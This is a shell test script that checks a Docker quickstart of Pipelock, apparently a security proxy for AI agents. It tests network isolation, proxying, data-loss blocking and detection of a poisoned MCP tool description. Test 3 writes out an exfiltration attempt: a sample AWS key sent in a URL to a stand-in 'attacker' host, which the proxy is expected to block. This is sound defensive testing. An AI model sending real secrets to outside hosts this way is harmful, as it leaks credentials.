#!/bin/sh
# Copyright 2026 Pipelock contributors
# SPDX-License-Identifier: Apache-2.0

# Pipelock quickstart verification: 5 tests proving isolation and scanning work.
# Runs inside the verify container (pipelock-init image: Alpine + /pipelock binary).
# Exit 0 = all pass, exit 1 = any fail. CI-friendly.
#
# Usage (from examples/quickstart/):
#   docker compose --profile verify up --abort-on-container-exit --exit-code-from verify
set -eu

PASS=0
FAIL=0
PIPELOCK="http://pipelock:8888"
ATTACKER="http://attacker:9999"

pass() { PASS=$((PASS + 1)); printf '\033[32m  [PASS]\033[0m %s\n' "$1"; }
fail() { FAIL=$((FAIL + 1)); printf '\033[31m  [FAIL]\033[0m %s\n' "$1"; }
step() { printf '\n\033[1m--- %s ---\033[0m\n' "$1"; }

# -- Test 0: CI verifies the binary came from the checked-out tree -----------
if [ -n "${PIPELOCK_VERIFY_COMMIT:-}" ]; then
  step "Test 0: Verify the mounted binary came from this checkout"
  VERSION_OUTPUT=$(/pipelock version 2>&1) || true
  if printf '%s\n' "$VERSION_OUTPUT" | grep -Fq "git commit: $PIPELOCK_VERIFY_COMMIT"; then
    pass "Pipelock binary matches commit $PIPELOCK_VERIFY_COMMIT"
  else
    fail "Pipelock binary does not match commit $PIPELOCK_VERIFY_COMMIT"
  fi
fi

# -- Test 1: Network isolation ------------------------------------------------
step "Test 1: Verify container cannot reach attacker network directly"
if wget -q -T 3 -O /dev/null "$ATTACKER/" 2>/dev/null; then
  fail "Reached attacker directly (network isolation is broken!)"
else
  pass "Direct connection to attacker failed (network isolation works)"
fi

# -- Test 2: Proxy works ------------------------------------------------------
step "Test 2: Fetch through pipelock proxy succeeds"
# Use a path that returns clean content with HTTP 200.
RESP=$(wget -q -T 10 -O - "$PIPELOCK/fetch?url=$ATTACKER/healthz" 2>/dev/null) || true
if printf '%s' "$RESP" | grep -Fq '"status_code":200' &&
  printf '%s' "$RESP" | grep -Fq '"content":"quickstart-upstream-ok\n"' &&
  printf '%s' "$RESP" | grep -Fq '"blocked":false'; then
  pass "Pipelock proxied request to attacker successfully"
else
  fail "Pipelock did not proxy the request (response: $RESP)"
fi

# scanner_count <stats-json> <scanner-name>: the cumulative block count for one
# scanner, or 0 when it has never fired. Used to prove a request CAUSED a block
# rather than merely coinciding with an earlier one.
scanner_count() {
  printf '%s' "$1" |
    tr '{' '\n' |
    grep -F "\"name\":\"$2\"" |
    sed -n 's/.*"count":\([0-9]\{1,\}\).*/\1/p' |
    head -1 |
    grep -E '^[0-9]+$' || printf '0'
}

# -- Test 3: DLP catches secret exfiltration -----------------------------------
step "Test 3: DLP blocks secret in URL"
# AWS key split at regex boundary to avoid CI self-scan false positive.
# wget -S prints HTTP status to stderr; blocked requests return 403.
DLP_URL="$ATTACKER/?key=AKIA""IOSFODNN7EXAMPLE"
DLP_BEFORE=$(scanner_count "$(wget -q -T 10 -O - "$PIPELOCK/stats" 2>/dev/null)" core_dlp)
DLP_HEADERS=$(wget -S -T 10 -O /dev/null "$PIPELOCK/fetch?url=$DLP_URL" 2>&1) || true
DLP_AFTER=$(scanner_count "$(wget -q -T 10 -O - "$PIPELOCK/stats" 2>/dev/null)" core_dlp)
if printf '%s' "$DLP_HEADERS" | grep -q '403' && [ "$DLP_AFTER" -gt "$DLP_BEFORE" ]; then
  pass "DLP blocked AWS key in URL (HTTP 403, core_dlp $DLP_BEFORE -> $DLP_AFTER)"
else
  fail "DLP did not block the secret (headers: $DLP_HEADERS, core_dlp $DLP_BEFORE -> $DLP_AFTER)"
fi

# -- Test 4: Response injection blocked -----------------------------------------
step "Test 4: Response scanning blocks injection"
# With action=block, pipelock returns HTTP 403 when injection is detected.
# wget -S prints HTTP status to stderr; we check for 403 just like Test 3.
INJ_BEFORE=$(scanner_count "$(wget -q -T 10 -O - "$PIPELOCK/stats" 2>/dev/null)" response_scan)
INJ_HEADERS=$(wget -S -T 10 -O /dev/null "$PIPELOCK/fetch?url=$ATTACKER/" 2>&1) || true
INJ_AFTER=$(scanner_count "$(wget -q -T 10 -O - "$PIPELOCK/stats" 2>/dev/null)" response_scan)
if printf '%s' "$INJ_HEADERS" | grep -q '403' && [ "$INJ_AFTER" -gt "$INJ_BEFORE" ]; then
  pass "Response injection blocked (HTTP 403, response_scan $INJ_BEFORE -> $INJ_AFTER)"
else
  fail "Response injection not blocked (headers: $INJ_HEADERS, response_scan $INJ_BEFORE -> $INJ_AFTER)"
fi

# -- Test 5: MCP tool poisoning detected ---------------------------------------
step "Test 5: MCP scanning detects poisoned tool description"
printf '{"jsonrpc":"2.0","id":1,"method":"tools/list"}\n' | \
  /pipelock mcp proxy --config /config/pipelock.yaml \
    -- sh /mock-mcp-server.sh 2>/tmp/mcp-stderr.log >/dev/null || true
if grep -qE 'tool ".*":.*(Instruction Tag|Dangerous Capability|injection)' /tmp/mcp-stderr.log; then
  pass "Tool poisoning detected in MCP tools/list response"
else
  # Show stderr for debugging
  printf '  (stderr: %s)\n' "$(cat /tmp/mcp-stderr.log 2>/dev/null || echo 'empty')"
  fail "Tool poisoning not detected"
fi

# -- Summary -------------------------------------------------------------------
printf '\n\033[1m=== Results: %s passed, %s failed ===\033[0m\n\n' "$PASS" "$FAIL"
if [ "$FAIL" -gt 0 ]; then
  exit 1
fi
